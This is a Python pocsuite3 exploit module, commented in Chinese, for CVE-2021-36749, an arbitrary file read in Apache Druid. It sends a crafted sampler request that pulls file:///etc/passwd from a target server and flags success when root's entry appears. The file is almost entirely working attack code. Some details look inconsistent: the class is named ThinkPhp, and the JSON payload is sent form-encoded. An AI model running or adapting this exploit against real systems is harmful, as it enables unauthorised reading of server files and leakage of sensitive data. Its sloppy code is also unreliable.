import re

from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class ThinkPhp(POCBase):
    vulID = "36749"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "19gh"  # PoC作者的大名
    vulDate = "2021-11-16"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-7-15"  # 编写 PoC 的日期
    updateDate = "2022-7-15"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/luck-ying/Library-POC"]  # 漏洞地址来源,0day不用写
    name = "Apache Druid 任意文件读取漏洞 PoC"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "CVE-2021-36749"  # 漏洞应用名称
    appVersion = "<= 0.21.1"  # 漏洞影响版本
    vulType = VUL_TYPE.ARBITRARY_FILE_READ  # 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = [""]  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """
                Apache Druid 任意文件读取漏洞，未经授权的远程攻击者可以通过构造恶意参数读取服务器上的任意文件，造成服务器敏感性信息泄露。
            """  # 漏洞简要描述
    pocDesc = """
                /druid/indexer/v1/sampler?for=connect
            """  # POC用法描述

    def _check(self):
        result = []

        # 漏洞验证代码
        full_url = f"{self.url}/druid/indexer/v1/sampler?for=connect"
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            "Content-Type": 'application/json;charset=UTF-8'
        }
        data = {"type": "index", "spec": {"type": "index", "ioConfig": {"type": "index", "inputSource": {"type": "http","uris": ["file:///etc/passwd"]},"inputFormat": {"type": "regex","pattern": "(.*)","listDelimiter": "56616469-6de2-9da4-efb8-8f416e6e6965","columns": ["raw"]}},"dataSchema": {"dataSource": "sample","timestampSpec": {"column": "!!!_no_such_column_!!!","missingValue": "1970-01-01T00:00:00Z"},"dimensionsSpec": {}}, "tuningConfig": {"type": "index"}},"samplerConfig": {"numRows": 500, "timeoutMs": 15000}}
        try:
            response = requests.post(full_url, headers=headers, data=data, allow_redirects=False, verify=False, timeout=5)

            # 判断是否存在漏洞
            if response.status_code == 200 and 'root:x:0' in response.text:
                result.append(self.url)

        except Exception as e:
            print(e)
        finally:
            return result

    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(ThinkPhp)
